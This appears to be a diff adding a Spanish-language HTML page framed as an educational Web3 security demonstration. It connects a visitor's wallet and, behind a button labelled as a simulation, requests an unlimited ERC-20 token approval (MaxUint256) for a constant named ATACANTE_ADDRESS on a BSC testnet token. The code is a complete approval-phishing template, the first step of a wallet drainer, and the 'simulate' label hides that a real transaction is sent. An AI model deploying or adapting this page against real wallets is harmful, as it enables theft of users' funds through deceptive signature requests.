@@ -1,0 +1,92 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Laboratorio de Seguridad Web3 - Demostración</title>
+    <!-- Cargamos la librería ethers.js para interactuar con la billetera -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
+    <style>
+        body { font-family: Arial, sans-serif; text-align: center; padding: 20px; background-color: #f4f4f9; }
+        .card { background: white; padding: 20px; border-radius: 10px; max-width: 400px; margin: 0 auto; box-shadow: 0 4px 6px rgba(0,0,0,0.1); }
+        button { background-color: #007bff; color: white; border: none; padding: 12px 20px; margin: 10px 0; border-radius: 5px; font-size: 16px; cursor: pointer; width: 100%; }
+        button.danger { background-color: #dc3545; }
+        p { word-break: break-all; font-size: 14px; }
+    </style>
+</head>
+<body>
+
+<div class="card">
+    <h2>Demostración Educativa Web3</h2>
+    <p>Aprende cómo funcionan las solicitudes de firma en dApps.</p>
+    
+    <button onclick="conectarBilletera()">1. Conectar Billetera</button>
+    <p id="wallet-address">Estado: No conectada</p>
+
+    <hr>
+
+    <button class="danger" onclick="solicitarAprobacion()">2. Simular Aprobación (Approve)</button>
+    <p id="status-text"></p>
+</div>
+
+<script>
+    // Dirección del Token de prueba en BSC Testnet (ej. BUSD Testnet)
+    const TOKEN_CONTRACT = "0xed24fc36d5ee211ea25a80239fb8c4cfd80f12ee";
+    
+    // Dirección de la segunda billetera (simulando la billetera receptora)
+    const ATACANTE_ADDRESS = "0xTU_SEGUNDA_DIRECCION_AQUI"; 
+
+    // ABI mínimo para invocar la función approve
+    const ABI_ERC20 = [
+        "function approve(address spender, uint256 amount) public returns (bool)"
+    ];
+
+    let provider, signer, userAddress;
+
+    async function conectarBilletera() {
+        if (window.ethereum) {
+            try {
+                // Solicita conexión a la billetera (No representa riesgo de fondos)
+                provider = new ethers.providers.Web3Provider(window.ethereum);
+                await provider.send("eth_requestAccounts", []);
+                signer = provider.getSigner();
+                userAddress = await signer.getAddress();
+                
+                document.getElementById("wallet-address").innerText = "Conectado: " + userAddress;
+            } catch (error) {
+                alert("Error al conectar: " + error.message);
+            }
+        } else {
+            alert("No se detectó un navegador Web3. Abre este enlace dentro de Trust Wallet o MetaMask.");
+        }
+    }
+
+    async function solicitarAprobacion() {
+        if (!signer) {
+            alert("Primero debes conectar tu billetera.");
+            return;
+        }
+
+        try {
+            document.getElementById("status-text").innerText = "Enviando solicitud a la billetera...";
+            
+            const contract = new ethers.Contract(TOKEN_CONTRACT, ABI_ERC20, signer);
+            
+            // MÁXIMO PERMISO POSIBLE (MaxUint256)
+            const maxAmount = ethers.constants.MaxUint256;
+
+            // Esto despliega la alerta en Trust Wallet pidiendo la confirmación del usuario
+            const tx = await contract.approve(ATACANTE_ADDRESS, maxAmount);
+            
+            document.getElementById("status-text").innerText = "Transacción enviada. Esperando confirmación...";
+            await tx.wait();
+            
+            document.getElementById("status-text").innerText = "¡Aprobación otorgada! Revisa el permiso en BscScan Testnet.";
+        } catch (error) {
+            document.getElementById("status-text").innerText = "Operación cancelada por el usuario o rechazada.";
+        }
+    }
+</script>
+
+</body>
+</html>
